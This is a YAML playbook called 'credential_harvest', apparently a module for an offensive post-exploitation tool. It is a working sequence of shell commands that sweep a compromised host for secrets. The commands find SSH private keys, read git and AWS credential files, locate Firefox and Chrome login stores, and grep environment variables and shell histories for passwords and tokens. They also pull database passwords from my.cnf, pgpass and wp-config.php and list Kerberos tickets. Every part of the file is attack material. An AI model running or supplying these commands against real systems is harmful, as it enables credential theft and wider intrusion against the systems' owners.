name: credential_harvest
description: Comprehensive credential and secret harvesting across the system
author: PhantomShell
version: "5.2"

steps:
  - name: Config File Credentials
    command: steal_configs
    store: config_creds

  - name: SSH Keys
    command: shell
    args:
      cmd: "find / -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' -o -name '*.pem' 2>/dev/null | head -20"
    store: ssh_keys

  - name: Git Credentials
    command: shell
    args:
      cmd: "find / -name '.git-credentials' -o -name '.gitconfig' 2>/dev/null | while read f; do echo '=== '$f; cat \"$f\" 2>/dev/null; done"
    store: git_creds

  - name: Browser Data
    command: shell
    args:
      cmd: "find / -path '*/.mozilla/firefox/*/logins.json' -o -path '*/.config/google-chrome/*/Login Data' 2>/dev/null"
    store: browser_paths

  - name: Environment Variables
    command: shell
    args:
      cmd: "env | grep -iE 'pass|key|secret|token|api|auth|credential|pwd' 2>/dev/null"
    store: env_secrets

  - name: History Files
    command: shell
    args:
      cmd: "cat ~/.bash_history ~/.zsh_history 2>/dev/null | grep -iE 'pass|password|mysql|psql|ssh|curl.*-u|wget.*--password' | tail -30"
    store: history_secrets

  - name: Database Credentials
    command: shell
    args:
      cmd: "cat ~/.my.cnf ~/.pgpass /etc/my.cnf 2>/dev/null; find /var/www -name 'wp-config.php' -exec grep -l 'DB_PASSWORD' {} \\; 2>/dev/null"
    store: db_creds

  - name: AWS Credentials
    command: shell
    args:
      cmd: "cat ~/.aws/credentials ~/.aws/config 2>/dev/null"
    store: aws_creds
    fail_fast: false

  - name: Kerberos Tickets
    command: shell
    args:
      cmd: "klist 2>/dev/null; find /tmp -name 'krb5cc_*' 2>/dev/null"
    store: kerberos
    fail_fast: false
